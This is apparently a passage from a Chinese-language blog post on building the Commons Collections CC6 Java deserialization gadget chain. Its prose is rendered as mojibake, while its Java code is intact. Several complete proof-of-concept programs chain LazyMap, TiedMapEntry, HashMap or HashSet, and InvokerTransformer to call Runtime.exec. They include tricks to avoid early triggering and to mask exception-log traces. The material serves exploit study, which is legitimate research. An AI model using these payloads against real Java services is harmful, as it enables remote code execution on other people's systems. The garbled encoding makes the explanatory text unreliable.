å¯¹è±¡ï¼ˆå³é”®å€¼å¯¹ï¼‰ï¼Œå¹¶åºåˆ—åŒ–æ¯ä¸ªé”®å€¼å¯¹ï¼Œè€Œå¯¹äºæ¯ä¸ª Map.Entryï¼ŒObjectOutputStream ä¼šè°ƒç”¨å®ƒä»¬çš„ getKey() å’Œ getValue() æ–¹æ³•æ¥è·å–é”®å’Œå€¼ï¼Œä»¥ä¾¿å¯¹å®ƒä»¬è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åObjectOutputStreamçš„writeObjectæ–¹æ³•å°±ä¼šå°è¯•å»åºåˆ—åŒ–ã€‚\nç„¶åç”±äºæˆ‘ä»¬è®¾ç½®çš„å€¼ï¼Œä¼ å…¥äº†TiedMapEntryç±»å®ä¾‹ï¼Œåœ¨è°ƒç”¨getValue()åä¼šè¿›å…¥LazyMapçš„get()æ–¹æ³•ä»è€Œå¯¼è‡´æ•´æ¡åˆ©ç”¨é“¾çš„è¿›è¡Œï¼Œç„¶åRuntime.getRuntime().exec(\u0026quot;calc\u0026quot;)ï¼Œè¿™ä¸ªè°ƒç”¨ä¼šå°è¯•å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œè¿”å›ä¸€ä¸ªä¸å¯åºåˆ—åŒ–çš„ Process å¯¹è±¡ã€‚ç”¨ä¸€ä¸ªä»£ç æµ‹è¯•ä¸€ä¸‹æ˜¯å¦ä¼šéå†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.Runtime; import java.util.HashMap; import java.io.Serializable; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main implements Serializable { public static void main(String args[]) throws Exception { HashMap o = new HashMap(); Runtime x = Runtime.getRuntime(); o.put(x,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } } è¿è¡Œç»“æœï¼š è¯´æ˜ç¡®å®åœ¨HashMapåºåˆ—åŒ–çš„æ—¶å€™ä¼šéå†æ¡ç›®å¹¶è°ƒç”¨writeObject()æ–¹æ³•å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå¦‚æœè¦åºåˆ—åŒ–çš„å¯¹è±¡æ²¡æœ‰å®šä¹‰writeObject()æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨é»˜è®¤çš„writeObject()æ–¹æ³•å»åºåˆ—åŒ–å®ƒï¼ˆå¯¹äºé»˜è®¤ä¸ªäººç†è§£åº”è¯¥æ˜¯ObjectOutputStreamçš„writeObjectæ–¹æ³•ï¼‰ã€‚\nç»“åˆå‰é¢çš„è§£é‡Šï¼Œé‚£ä¹ˆå°±æ˜¯ç”±äºè°ƒç”¨äº†TiedMapEntryçš„getValue()æ–¹æ³•ï¼Œç„¶åè¿›è¡Œé“¾å¼ååº”ï¼Œæœ€ç»ˆä¼šè¿”å›ä¸€ä¸ªProcesså¯¹è±¡ä½œä¸ºè¿™ä¸ª\u0026quot;value\u0026quot;ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å¯è¢«åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æœ€ç»ˆä¼šæŠ¥é”™ä¸å¯è¢«åºåˆ—åŒ–ã€‚\né‚£ä¹ˆå¯¹äºCC1ä¸­çš„LazyMapé“¾ï¼šé‚£é‡Œé€šè¿‡ä½¿ç”¨ AnnotationInvocationHandler ä»£ç†åŒ…è£… LazyMapï¼Œé¿å…åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘å˜æ¢å™¨é“¾ï¼Œé¿å…äº†å¼‚å¸¸ã€‚ â€”â€”â€”â€”â€”â€”\né‚£ä¹ˆå¯¹äºè¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ³•ï¼Œysoserialæ—©åœ¨CC1ä¸­å°±æœ‰äº†ä¼˜åŒ–ï¼š å®ƒè¿™é‡Œæ˜¯æœ€åæ‰å°†æ¶æ„transformersæ•°ç»„è®¾ç½®åˆ°transformerChainä¸­ï¼Œè§£å†³é—®é¢˜çš„æ–¹æ³•å°±åœ¨è¿™é‡Œã€‚\nåŒæ—¶æ³¨æ„çœ‹åŸºæœ¬ç›˜ä»£ç é‡Œé¢ï¼Œæ·»åŠ äº†ä¸€ä¸ªConstantTransformer(1)ï¼Œè¿™æ˜¯ä¸ºäº†éšè—å¼‚å¸¸æ—¥å¿—ä¸­çš„ä¿¡æ¯ï¼Œèµ·åˆ°äº†éšè”½å¯åŠ¨è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾çš„ä½œç”¨ã€‚ä»¥CC1ä¸ºä¾‹çœ‹ä¸€ä¸‹ä½¿ç”¨è¿‡åçš„å·®åˆ«ï¼š ä½¿ç”¨å‰çš„ç‰¹å¾ï¼š\nä½¿ç”¨åçš„ç‰¹å¾ï¼š\nä½¿ç”¨ååŒæ ·æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œä½†æ˜¯è¿™é‡Œçš„å¼‚å¸¸æ—¥å¿—ç‰¹å¾å·²ç»è¢«æ”¹å˜äº†ã€‚\nè§£å†³æ–¹æ³•å°±åœ¨é‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åˆ©ç”¨é“¾çš„æœ€ååŠ ä¸Šä¸€ä¸ªnew ConstantTransformer(1)ï¼Œç†Ÿæ‚‰è¿™ä¸ªç±»çš„transformer()æ–¹æ³•å°±å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œä¸ä¼šç®¡ä¼ å…¥çš„inputï¼Œè¿™é‡Œå°±ä¼šç›´æ¥è¿”å›ä¸€ä¸ª1ï¼Œå†ç»“åˆæ­£å¸¸çš„ä¾‹å¦‚put(1,\u0026quot;xxx\u0026quot;)è¿™ç§ï¼Œè¿™æ ·åœ¨åºåˆ—åŒ–æ—¶å°±ä¸ä¼šæŠ¥æ— æ³•åºåˆ—åŒ–çš„é”™è¯¯ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥èµ·åˆ°éšè—æ—¥å¿—çš„ä½œç”¨ã€‚\næ‰€ä»¥ä¿®æ”¹åçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰æˆåŠŸååºåˆ—åŒ–ï¼Œå¦åˆ™åº”è¯¥ä¼šå¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºã€‚\nè°ƒè¯•ä¸€ä¸‹ï¼ŒåŠ æ–­ç‚¹å¦‚ä¸‹ï¼š åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°å¦‚ä¸‹æƒ…å†µ\nä¹Ÿå°±æ˜¯è¿™é‡Œçš„ifæ¡ä»¶å¹¶æ²¡æœ‰é€šè¿‡ï¼Œè¿˜æ˜¾ç¤ºä¸€ä¸ªnullï¼Œå°±æ˜¯å› ä¸ºæˆ‘åœ¨ä¼ åˆå§‹åŒ–TiedMapEntryæ—¶å°†keyè®¾ç½®ä¸ºäº†nullï¼Œè€Œè°ƒç”¨get()æ–¹æ³•çš„é€»è¾‘æ˜¯å°†keyä¼ è¿›å»äº†çš„ï¼š\nè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨LazyMapçš„get()æ–¹æ³•ä¸­æ˜¾ç¤ºçš„æ˜¯nullã€‚\næ‰€ä»¥éœ€è¦æ”¹ä¸€ä¸‹POCï¼Œè¿™é‡Œç›´æ¥å°†keyè®¾ç½®æˆä¸€ä¸ªå¯è§å­—ç¬¦å°±è¡Œäº†ï¼Œå…·ä½“çœ‹åé¢çš„ä»£ç ã€‚\nåŒæ—¶è§£å†³ä¸€ä¸ªé—®é¢˜ï¼šåœ¨åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨put()æ—¶ä¼šå¼¹å‡ºè®¡ç®—æœºçš„é—®é¢˜ æ€è·¯ï¼šå¯ä»¥å…ˆä¼ å…¥ä¸€ä¸ªå‡çš„â€œé“¾â€ï¼Œåœ¨putè¿‡åå†è°ƒç”¨åå°„å°†è¿™ä¸ªåˆ©ç”¨é“¾ä¼ å›å»ã€‚\nçœ‹è¿™ä¸ªChainedTransformerçš„åˆ©ç”¨çš„å˜é‡ï¼š ä¹Ÿå°±æ˜¯è¿™ä¸ªiTransformerså˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·å¹²ï¼Œçœ‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //å…ˆå®šä¹‰ä¸€ä¸ªå‡çš„transformer Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; //å†å£°æ˜ä¸€ä¸ªåˆ©ç”¨é“¾ Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; //å…ˆä¼ å…¥å‡çš„transformer Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); //åœ¨putè¿‡åï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰ï¼Œè°ƒç”¨åå°„å°†å‡çš„é“¾æ¢æˆçœŸçš„chainpart Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); //ç„¶åå†è¿›è¡Œåºåˆ—åŒ– æ•´åˆè¿›å…¨éƒ¨ä»£ç å°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸä¸å†å¼¹å‡ºç”±äºputè€Œå¼•èµ·çš„è®¡ç®—æœºï¼Œä½†æ˜¯ååºåˆ—åŒ–åŒ–çŸ³ç­æœ‰å¼¹å‡ºè®¡ç®—æœºã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆæ²¡æœ‰ååºåˆ—åŒ–æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼ŸåŒæ ·è°ƒè¯•ï¼Œå‘ç°ï¼š\nè¿™é‡Œçš„keyæ˜¯fupancï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨å®ä¾‹åŒ–æ—¶TiedMapEntryä¼ å…¥çš„\u0026quot;fupanc\u0026quot;ï¼Œå¯¹äºè¿™é‡Œçš„keyä¸ºfupancå¾ˆæ­£å¸¸\nä½†æ˜¯è¿™é‡Œçš„get()æ–¹æ³•çš„ifæ¡ä»¶æ²¡æœ‰é€šè¿‡çš„åŸå› ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜æœ‰å¯¹è±¡ä¸­æœ‰fupancè¿™ä¸ªé”®ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªç°è±¡å‘¢ï¼Œçœ‹ä»£ç \nåŸå› å°±æ˜¯è¿™ä¸ªï¼Œputæ–¹æ³•è¿½æº¯æºç åä¹Ÿä¼šè°ƒç”¨hashCode()æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¼ å…¥äº†TiedMapEntryç±»å¯¹è±¡çš„outerMapï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿä¼šè¿›å…¥åˆ°LazyMap#get()ï¼Œå‰©ä¸‹é‡ç‚¹çœ‹get()æ–¹æ³•çš„æºç ï¼š æˆ‘ä»¬ç¬¬ä¸€æ¬¡ç¡®å®æ˜¯æ²¡æœ‰keyä¸ºfupancçš„é”®å€¼å¯¹ï¼Œä½†æ˜¯çœ‹get()æ–¹æ³•çš„æºç ï¼Œåœ¨è¿›å…¥ifæ¡ä»¶åï¼Œè¿™é‡Œç»è¿‡transformæ–¹æ³•è¿”å›valueï¼Œåœ¨ifè¯­å¥çš„æœ€åè°ƒç”¨äº†this.map.put(key,value); ä¹Ÿå°±æ˜¯è°ƒç”¨äº†HashMapçš„putæ–¹æ³•å¹¶ä¼ å…¥äº†ä¸€ä¸ªkeyä¸ºfupancï¼Œvalueä¸º1çš„é”®å€¼å¯¹ï¼ˆKey=fupancï¼ŒValue=1ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå› ä¸ºå¯¹è±¡ä¸­æœ‰è¿™ä¸ªé”®ä¸ºfupancçš„é”®å€¼å¯¹è€Œå¤±è´¥ã€‚\nè§£å†³æ–¹æ³•ï¼šå¾ˆç®€å•ï¼Œåœ¨è°ƒç”¨putæ–¹æ³•åï¼Œæˆ‘ä»¬å†è°ƒç”¨removeæ–¹æ³•æ¥åˆ æ‰è¿™ä¸ªé”®å€¼å¯¹å³å¯ï¼ˆä¸€å®šè¦æ³¨æ„é”®å€¼å¯¹æ‰€å±å¯¹è±¡çš„é—®é¢˜ï¼‰ã€‚\né‚£ä¹ˆæœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\né—®é¢˜æ€»ç»“ æ€»ç»“å‰é¢çš„é—®é¢˜ï¼š\næ— æ³•åºåˆ—åŒ–Processå¯¹è±¡é—®é¢˜ åºåˆ—åŒ–ä¹‹å‰å¼¹è®¡ç®—æœºçš„è§£å†³æ–¹æ³• éœ€è¦removeçš„åŸå› ã€‚ åˆ©ç”¨HashSeté“¾ ysoserialé“¾ä»‹ç»äº†java.util.HashSetä½œä¸ºååºåˆ—åŒ–çš„å…¥å£ï¼Œåœ¨HashSetç±»çš„readObject()æ–¹æ³•çš„æœ€åï¼Œä¼šè§¦å‘map.putæ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Consume and ignore stream fields (currently zero). s.readFields(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal capacity: \u0026#34; + capacity); } // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) { throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); } // Clamp load factor to range of 0.25...4.0. loadFactor = Math.min(Math.max(0.25f, loadFactor), 4.0f); // Read size and verify non-negative. int size = s.readInt(); if (size \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal size: \u0026#34; + size); } // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Constructing the backing map will lazily create an array when the first element is // added, so check it before construction. Call HashMap.tableSizeFor to compute the // actual allocation size. Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what is actually created. SharedSecrets.getJavaOISAccess() .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity)); // Create backing HashMap map = (((HashSet\u0026lt;?\u0026gt;)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E e = (E) s.readObject(); map.put(e, PRESENT); } } é‡ç‚¹å°±æ˜¯æœ€åçš„forå¾ªç¯ï¼š è¿™é‡Œçš„mapåŒæ ·æ˜¯ä¸€ä¸ªHashMapå¯¹è±¡ï¼ŒHashSetç±»åˆå§‹åŒ–æ—¶åŸºæœ¬éƒ½æ˜¯å°†mapè®¾ç½®ä¸ºä¸€ä¸ªåˆå§‹åŒ–çš„HashMapç±»ï¼š\nç­‰æ„é€ æ–¹æ³•ã€‚\nè€ŒHashMap.putæ–¹æ³•å‰é¢ä¹Ÿè¯´è¿‡ï¼Œæºç æ”¾è¿‡æ¥ä¸€ä¸‹ï¼š\næ‰€ä»¥ç„¶åè°ƒç”¨hash() ==\u0026gt; hashCode() ==\u0026gt; getValue() ==\u0026gt; get() ==\u0026gt; transform()ä¹Ÿå°±æ˜¯æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰çš„æ“ä½œäº†ã€‚\næ‰€ä»¥åœ¨å‰é¢çš„HashSet#readObject()ä¸­çš„eéœ€è¦ä¸ºTiedMapEntrryç±»å®ä¾‹\næ¥ç¨å¾®çœ‹ä¸€ä¸‹HashSetç±»çš„å˜é‡ï¼š\nè¿™é‡Œç›´æ¥è¯´æ˜äº†PRESENTçš„å€¼ä¸ºObjectç±»çš„å®ä¾‹ã€‚å¹¶ä¸”æ³¨æ„çœ‹HashSetç±»çš„æ„é€ æ–¹æ³•ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯ç›´æ¥å°†mapå®šä¹‰ä¸ºHashMapç±»çš„å®ä¾‹ã€‚æ‰€ä»¥è¿™é‡Œåœ¨åˆ©ç”¨HaseSetç±»æ—¶ç›´æ¥æ”¾å¿ƒå°†mapç›´æ¥å½“åšHashMapå¯¹è±¡å³å¯ã€‚\nåŒæ—¶åœ¨HashSetä¸­æä¾›äº†ä¸€ä¸ªaddæ–¹æ³•ï¼š è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯å‘ HashSet ä¸­æ·»åŠ ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœè¯¥å…ƒç´ å·²ç»å­˜åœ¨äº HashSet ä¸­ï¼Œé‚£ä¹ˆä¸ä¼šæ·»åŠ ï¼Œå¹¶ä¸”è¿”å› falseã€‚å¦åˆ™ï¼Œä¼šå°†è¯¥å…ƒç´ æ·»åŠ åˆ° HashSet ä¸­ï¼Œå¹¶è¿”å› trueã€‚\næµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.util.HashSet; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); } } /*output: true true false è°ƒè¯•ä¸€ä¸‹ï¼Œåœ¨trueéƒ¨åˆ†åŠ æ–­ç‚¹ï¼š è¿›å…¥add()æ–¹æ³•æºç \néšåç¡®å®è¿›å…¥äº†putæ–¹æ³•ï¼Œï¼š\nåŒæ—¶è·Ÿä¸€ä¸‹æºç ï¼Œç¡®å®è¿›è¡Œäº†åœ¨HashMapä¸­çš„putæ“ä½œã€‚ä¸ºäº†æ–¹ä¾¿ç†è§£è¿™é‡Œçš„è¿”å›trueå’Œfalseçš„åŒºåˆ«ï¼Œè¿˜æ˜¯ç”¨ä»£ç æ¥è¯´æ˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.util.HashSet; import java.util.HashMap; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); // HashMap hashMap = new HashMap(); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); } } /*output: true true false null xxxx ä¹Ÿå°±æ˜¯åœ¨HashMapçš„putæ–¹æ³•ä¸­ï¼Œå¦‚æœæ²¡æœ‰é”®åˆ™ä¼šæˆåŠŸæ”¾å…¥é”®å€¼å¯¹å¹¶è¿”å›nullï¼Œå¦åˆ™å°±ä¼šè¿”å›é”®å¯¹åº”çš„å€¼ã€‚\nç°åœ¨å¯¹äºå‰é¢çš„addæ–¹æ³•è¿”å›çš„å¸ƒå°”å€¼å°±å¾ˆå¥½ç†è§£äº†ï¼š\nå› ä¸ºæˆåŠŸputè¿›äº†fupané”®å’Œhahaé”®ï¼Œæ‰€ä»¥è¿”å›nullï¼Œä¸addæ–¹æ³•ä¸­å®šä¹‰çš„map.put(e, PRESENT)==nullç­‰å·æˆç«‹ï¼Œè¿”å›tureï¼Œè¡¨æ˜æˆåŠŸæ”¾å…¥é”®å€¼å¯¹ï¼Œ è€Œç”±äºå‰é¢å·²ç»putè¿›äº†fupancé”®ï¼Œå¯¼è‡´å†æ¬¡è°ƒç”¨putæ·»åŠ fupancé”®è¿”å›çš„æ˜¯å‰é¢å®šä¹‰çš„fupancé”®çš„valueï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯Objectç±»çš„å®ä¾‹ï¼Œä½†è¿™æ ·å¹¶ä¸ä¸nullç›¸åŒï¼Œæ‰€ä»¥è¿”å›çš„æ˜¯falseï¼Œè¡¨æ˜å¹¶æ²¡æœ‰æˆåŠŸæ”¾å…¥é”®å€¼å¯¹ ç°åœ¨ä¹Ÿå°±åŸºæœ¬é€šäº†ï¼Œç»“åˆå‰é¢çš„HashMapçš„ç†è§£ï¼Œå¯ä»¥ç›´æ¥ç¼–å†™ä¸‹é¢çš„POCæ¥æµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashSet); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 